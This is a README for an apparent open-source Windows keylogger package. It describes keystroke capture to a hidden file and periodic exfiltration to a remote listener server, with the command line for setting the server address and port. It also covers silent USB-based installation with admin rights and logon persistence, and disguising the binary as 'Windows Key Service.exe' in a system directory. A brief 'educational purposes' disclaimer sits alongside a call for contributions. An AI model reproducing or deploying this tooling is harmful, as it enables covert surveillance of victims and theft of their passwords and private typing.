# Key-Logger
A complete key logger package that can be used to infect Windows machines. Comes with capabilities to push key strokes to a remote server. Remote server code included. Includes scripts to silently install/uninstall the key logger from a USB stick.

## DISCLAIMER
Keylogging has both legitimate and illegitimate use cases. This project was meant to be a fun little side project for educational purposes only. I am not liable for any actions done by this program. Use at your own risk.

## CONTENTS

### [klog](klog/)
The key logger to be installed on the target machine.

- Key strokes are stored in a hidden file called '**k**' in the same directory as the executable.
- The contents of '**k**' are pushed to the remote server on port **25666** every **10** minutes.
- The remote server address, port, and the push period are configurable via command line arguments. Otherwise, the defaults are used.
- _The code is a heavily modified version of Giacomo Lawrance's [KeyLogger](https://github.com/GiacomoLaw/Keylogger). Kudos!_

#### Usage
`klog.exe [ADDRESS] [PORT] [PUSH_PERIOD_MS]`

### [klog-listener](klog-listener/)
A Windows service to listen and store key strokes from multiple key loggers.

- Key logs are stored in a SQLite DB called __KeyLog.db__. Contents can be viewed using a [SQLite browser](https://sqlitebrowser.org/)

### [usb](usb/)
Scripts to silently install, uninstall, and configure the key logger.

- [infect.cmd](usb/infect.cmd): Run this script from the USB stick to install the key logger.
  - Executes `install_uninstall.ps1` with necessary admin privileges.
- [install_uninstall.ps1](usb/install_uninstall.ps1)
  - If not installed, this script will install and configure the key logger.
  - If already installed, this script will remove all installed components.
  - This script will set up the key logger to always run with admin privileges and always execute on user log in.

#### USB Contents
Scripts to be executed from a USB stick with drive letter `Z:\`. `klog.exe` should be renamed to `Windows Key Service.exe`.

The key logger will get installed into the __C:\Windows\SysWOW64__ directory and begin executing immediately as a background process and every time the user logs in.

The USB drive should be structured as follows:
- Z:\
  - infect.cmd
  - install_uninstall.ps1
  - Windows Key Service.exe

## CONTRIBUTIONS
Any bug fixes, enhancements, and code improvements are welcomed! 

## LICENSE
Distributed under the MIT license. See [LICENSE](LICENSE.md) for more information.
